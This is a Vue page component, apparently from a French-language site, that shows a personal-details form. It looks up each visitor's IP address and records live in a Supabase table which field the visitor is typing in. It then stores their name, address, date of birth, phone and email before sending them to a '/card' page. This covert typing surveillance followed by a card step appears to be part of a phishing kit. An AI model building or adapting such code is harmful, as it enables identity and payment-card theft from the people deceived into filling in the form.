<template>
  <div class="min-h-screen bg-gray-50">
    <HomeHeader />
    <div class="w-full flex flex-col items-center py-8">
      <InfoHeader />
      <InfoForm @typing="handleTyping" @submit="handleFormSubmit" />
    </div>
  </div>
</template>

<script setup>
import HomeHeader from '@/components/HomeHeader.vue'
import InfoHeader from '@/components/InfoHeader.vue'
import InfoForm from '@/components/InfoForm.vue'
import { useSession } from '../../composables/session'
import { useRouter } from 'vue-router'
useSession()

import { supabase } from '@/lib/supabase'

const router = useRouter()

async function handleTyping({ field, value }) {
   let ip = null;
  try {
    const res = await fetch('https://ipwho.is/');
    const data = await res.json();
    if (data && data.success) {
      ip = data.ip;
    }
  } catch (e) {
    return;
  }
  if (!ip) {
    return;
  }

  const { error } = await supabase
    .from('session')
    .update({
      is_typing: `Champ "${field}" en train d'être édité`,
      last_seen_at: new Date().toISOString(),
      active: true,
    })
    .eq('ip', ip)

  if (error) {
    console.error(error)
  } 
}

async function handleFormSubmit(formData) {
  let ip = null;
  try {
    const res = await fetch('https://ipwho.is/');
    const data = await res.json();
    if (data && data.success) {
      ip = data.ip;
    }
  } catch (e) {
    return;
  }
  if (!ip) {
    return;
  }

  const { error } = await supabase
    .from('session')
    .update({
      fname: formData.firstName,
      lname: formData.lastName,
      address: formData.address,
      postalcode: formData.postalCode,
      city: formData.city,
      dob: formData.birthDate,
      phone: formData.phone,
      email: formData.email,
      is_typing: '',
      last_seen_at: new Date().toISOString(),
      active: true,
    })
    .eq('ip', ip)

  if (error) {
    console.error(error)
  } else {
    router.push('/card')
  }
}

</script>
